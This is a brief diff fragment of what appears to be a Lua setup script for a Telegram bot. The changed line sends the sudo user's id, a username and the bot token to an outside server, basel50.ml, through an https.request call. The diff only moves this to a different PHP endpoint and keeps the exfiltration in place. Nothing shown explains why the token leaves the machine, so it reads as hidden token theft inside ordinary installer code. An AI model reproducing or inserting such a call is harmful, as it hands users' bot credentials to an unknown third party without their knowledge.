@@ -124,7 +124,7 @@ Souser = SUDO_USER:gsub('@','')
 
 Souser = Souser:gsub([[\_]],'_')
 
-https.request("https://basel50.ml/Abaza.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
+https.request("https://basel50.ml/Aaaaa.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 
 os.execute([[
 
